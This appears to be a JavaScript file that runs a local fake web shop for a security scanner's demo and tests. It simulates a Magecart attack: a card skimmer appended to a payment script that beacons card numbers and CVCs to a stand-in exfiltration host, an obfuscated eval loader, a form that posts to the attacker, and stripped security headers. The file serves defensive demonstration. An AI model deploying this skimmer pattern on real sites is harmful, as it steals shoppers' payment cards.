// "Acme Outfitters": a tiny local web shop used by `npm run demo`, the GIF
// recorder and tests/integration/demo.test.ts.
//
// One HTTP server on 127.0.0.1 answers for several fake hostnames (reserved
// `.test` names, dispatched on the Host header). ThirdSentry reaches them
// through its egress proxy via `security.network.resolverOverrides`, so the
// demo never touches the internet and nothing it "steals" leaves this process.
//
// The shop has two states:
//   clean        what the merchant reviewed and approved
//   compromised  a Magecart-style attack, five changes at once:
//     1. the payment vendor's pay.js gets a card skimmer appended (supply-chain compromise)
//     2. a new "jquery" loader from a lookalike domain, obfuscated, runs eval (polyfill.io style)
//     3. stolen data is beaconed to a never-seen-before collection domain
//     4. the checkout form gets an extra card field and posts to the attacker
//     5. the Content-Security-Policy and X-Frame-Options headers are gone
//
// All "malicious" code here is harmless: it reads form fields and sends them
// to collect.exfil.test, which is this same server and discards the data.

import http from 'node:http';

export const DEMO_HOSTS = ['shop.demo.test', 'cdn.payvendor.test', 'tags.analytics.test', 'cdn-assets-cloud.test', 'collect.exfil.test'];

const SHOP = 'shop.demo.test';

/** thirdsentry.yml contents (as an object) for scanning the demo shop on `port`. */
export function demoConfig(port) {
  return {
    version: 1,
    sites: [
      {
        name: 'acme-outfitters',
        url: `http://${SHOP}:${port}/`,
        pages: ['/', '/checkout'],
        sensitivePages: ['/checkout'],
      },
    ],
    defaults: { scan: { timeout: 20_000, waitUntil: 'networkidle', networkIdleTimeout: 3_000, settleMs: 750 } },
    security: {
      network: {
        allowedPorts: [port],
        // The demo hosts live on 127.0.0.1; allow exactly these names to resolve there.
        allowedPrivateHosts: [...DEMO_HOSTS],
        resolverOverrides: Object.fromEntries(DEMO_HOSTS.map((h) => [h, '127.0.0.1'])),
      },
    },
    retention: { scriptContent: 'all' },
    // Keep the demo output focused on the attack (library CVEs are shown in docs/libraries.md).
    libraries: { detect: false, vulnerabilities: false },
    failOn: 'high',
  };
}

const STYLE = `
  :root { color-scheme: light; --ink:#14213d; --muted:#5c6784; --line:#e3e7f0; --brand:#2a5bd7; --bg:#f6f7fb; }
  * { box-sizing: border-box; }
  body { margin:0; font: 15px/1.5 system-ui, -apple-system, "Segoe UI", sans-serif; color: var(--ink); background: var(--bg); }
  header { background:#fff; border-bottom:1px solid var(--line); padding:14px 28px; display:flex; justify-content:space-between; align-items:center; }
  header b { font-size:18px; letter-spacing:.3px; } header a { color: var(--brand); text-decoration:none; font-weight:600; }
  main { max-width: 920px; margin: 28px auto; padding: 0 20px; }
  .grid { display:grid; grid-template-columns: repeat(3, 1fr); gap:16px; }
  .card { background:#fff; border:1px solid var(--line); border-radius:12px; padding:16px; }
  .swatch { height:110px; border-radius:8px; margin-bottom:10px; }
  .price { color: var(--muted); }
  form { display:grid; gap:12px; max-width:420px; }
  label { display:grid; gap:4px; font-size:13px; color: var(--muted); }
  input { font: inherit; padding:10px 12px; border:1px solid var(--line); border-radius:8px; }
  button { font: inherit; font-weight:600; padding:12px; border:0; border-radius:8px; background: var(--brand); color:#fff; }
`;

const layout = (title, body, head = '') => `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>${title} · Acme Outfitters</title>
<style>${STYLE}</style>
${head}
</head><body>
<header><b>🏔 Acme Outfitters</b><a href="/checkout">Cart (2) →</a></header>
<main>${body}</main>
</body></html>`;

const PRODUCTS = [
  ['Trail Jacket', '€189', '#9db4e8'],
  ['Summit Pack 30L', '€129', '#f2c48d'],
  ['Merino Base Layer', '€79', '#a8d5ba'],
];

function homePage(port) {
  const u = (host, path) => `http://${host}:${port}${path}`;
  const cards = PRODUCTS.map(([name, price, c]) => `<div class="card"><div class="swatch" style="background:${c}"></div><b>${name}</b><div class="price">${price}</div></div>`).join('');
  return layout(
    'Home',
    `<h1>New season gear</h1><div class="grid">${cards}</div>`,
    `<script>window.acme = { currency: 'EUR', region: 'eu' };</script>
<script src="/assets/app.js"></script>
<script src="${u('tags.analytics.test', '/tag.js')}" async></script>`,
  );
}

function checkoutPage(port, compromised) {
  const u = (host, path) => `http://${host}:${port}${path}`;
  const action = compromised ? u('collect.exfil.test', '/order') : '/order';
  // A "verify your card" field that the real checkout never had.
  const injected = compromised ? `\n  <label>Card PIN (verification)<input name="card_pin" autocomplete="off" inputmode="numeric"></label>` : '';
  const loader = compromised ? `\n<script src="${u('cdn-assets-cloud.test', '/jquery.min.js')}"></script>` : '';
  return layout(
    'Checkout',
    `<h1>Checkout</h1>
<div class="card">
<form action="${action}" method="post">
  <label>Email<input name="email" type="email" autocomplete="email"></label>
  <label>Name on card<input name="cc_name" autocomplete="cc-name"></label>
  <label>Card number<input name="cardnumber" autocomplete="cc-number" inputmode="numeric"></label>
  <label>Expiry<input name="exp" autocomplete="cc-exp"></label>
  <label>CVC<input name="cvc" autocomplete="cc-csc" inputmode="numeric"></label>${injected}
  <button type="submit">Pay €318</button>
</form>
</div>`,
    `<script src="${u('cdn.payvendor.test', '/v3/pay.js')}"></script>
<script src="${u('tags.analytics.test', '/tag.js')}" async></script>${loader}`,
  );
}

const APP_JS = `/* Acme storefront */
(function () {
  document.addEventListener('DOMContentLoaded', function () {
    document.documentElement.dataset.ready = 'true';
  });
})();
`;

const ANALYTICS_TAG = (port) => `/* Acme analytics tag, build 2.4.1 */
(function () {
  var body = JSON.stringify({ page: location.pathname, ref: document.referrer, ts: Date.now() });
  navigator.sendBeacon('http://tags.analytics.test:${port}/collect', body);
})();
`;

const PAY_JS = `/* PayVendor hosted checkout, build 3.8.2 */
(function (w) {
  var mounted = false;
  w.PayVendor = {
    version: '3.8.2',
    mount: function (selector) {
      mounted = !!document.querySelector(selector);
      return mounted;
    },
    tokenize: function (card) {
      return Promise.resolve({ token: 'tok_' + String(card.number).slice(-4) });
    },
  };
})(window);
`;

// Appended to pay.js in the compromised state: a harmless re-implementation of
// the classic form-jacking pattern (read card fields, encode, beacon out).
const SKIMMER = (port) => `
;(function () {
  var endpoint = 'http://collect.exfil.test:${port}/i.gif';
  function grab() {
    var data = {};
    var fields = document.querySelectorAll('input[name*="card"], input[autocomplete^="cc-"], input[name*="cvc"]');
    for (var i = 0; i < fields.length; i++) data[fields[i].name] = fields[i].value;
    new Image().src = endpoint + '?d=' + btoa(JSON.stringify(data));
  }
  document.addEventListener('submit', grab, true);
  document.addEventListener('change', function (e) { if (/card|cc-|cvc/.test(e.target.name + e.target.autocomplete)) grab(); }, true);
  new Image().src = endpoint + '?hello=' + encodeURIComponent(location.host);
})();
`;

// The lookalike-domain loader: string table, hex identifiers, base64 and eval.
// The decoded payload only sets a flag on window.
function lookalikeLoader() {
  const table = Array.from({ length: 48 }, (_, i) => `'\\x73\\x74\\x72\\x${(30 + (i % 10)).toString()}'`).join(',');
  const idents = Array.from({ length: 24 }, (_, i) => `var _0x${(0x3c1f + i).toString(16)}=${i};`).join('');
  const payload = Buffer.from('window.__acmeLoader = { stage: 2, ok: true };').toString('base64');
  return `var _0x5e2a=[${table}];${idents}
var _0xd3c=function(i){return _0x5e2a[i-0x0];};
var _0xp=atob('${payload}');var _0xq=atob('${Buffer.from('ready').toString('base64')}');
eval(_0xp);`;
}

const CSP = (port) =>
  `default-src 'self'; script-src 'self' http://cdn.payvendor.test:${port} http://tags.analytics.test:${port}; style-src 'self' 'unsafe-inline'; ` +
  `img-src 'self' data:; connect-src 'self' http://tags.analytics.test:${port}; form-action 'self'; frame-ancestors 'none'`;

/**
 * Create the demo server. `start()` resolves to the port; `setState()` switches
 * between 'clean' and 'compromised'. While running, GET /__state/<state> on
 * 127.0.0.1 or localhost switches too (for --keep-server).
 */
export function createDemoServer() {
  let state = 'clean';
  let port = 0;
  let server;

  function route(host, path) {
    const compromised = state === 'compromised';
    const js = (body) => ({ type: 'application/javascript', body });
    if (host === SHOP) {
      if (path === '/') return { type: 'text/html; charset=utf-8', body: homePage(port) };
      if (path === '/checkout') {
        const headers = compromised ? {} : { 'content-security-policy': CSP(port), 'x-frame-options': 'DENY' };
        return { type: 'text/html; charset=utf-8', body: checkoutPage(port, compromised), headers };
      }
      if (path === '/assets/app.js') return js(APP_JS);
    }
    if (host === 'cdn.payvendor.test' && path === '/v3/pay.js') return js(compromised ? PAY_JS + SKIMMER(port) : PAY_JS);
    if (host === 'tags.analytics.test') {
      if (path === '/tag.js') return js(ANALYTICS_TAG(port));
      if (path === '/collect') return { status: 204 };
    }
    if (host === 'cdn-assets-cloud.test' && path === '/jquery.min.js' && compromised) return js(lookalikeLoader());
    if (host === 'collect.exfil.test') return { status: 204 }; // the "attacker": accepts and discards everything
    return undefined;
  }

  function handle(req, res) {
    const host = (req.headers.host ?? '').split(':')[0] ?? '';
    const path = (req.url ?? '/').split('?')[0] ?? '/';
    if ((host === '127.0.0.1' || host === 'localhost') && path.startsWith('/__state/')) {
      const next = path.slice('/__state/'.length);
      if (next !== 'clean' && next !== 'compromised') return res.writeHead(400).end('use /__state/clean or /__state/compromised\n');
      state = next;
      return res.writeHead(200, { 'content-type': 'text/plain' }).end(`acme-outfitters is now ${state}\n`);
    }
    req.resume();
    const r = route(host, path);
    if (!r) return res.writeHead(404, { 'content-type': 'text/plain' }).end('not found');
    const headers = { 'cache-control': 'no-store', ...(r.type ? { 'content-type': r.type } : {}), ...(r.headers ?? {}) };
    if (host === 'collect.exfil.test' || path === '/collect') headers['access-control-allow-origin'] = '*';
    res.writeHead(r.status ?? 200, headers).end(r.body);
  }

  return {
    get port() {
      return port;
    },
    get state() {
      return state;
    },
    setState(next) {
      if (next !== 'clean' && next !== 'compromised') throw new Error(`unknown state ${next}`);
      state = next;
    },
    async start(listenPort = 0) {
      server = http.createServer(handle);
      server.keepAliveTimeout = 1000;
      await new Promise((resolve, reject) => {
        server.once('error', reject);
        server.listen(listenPort, '127.0.0.1', resolve);
      });
      port = server.address().port;
      return port;
    },
    async stop() {
      if (!server) return;
      server.closeAllConnections();
      await new Promise((resolve) => server.close(() => resolve()));
    },
  };
}
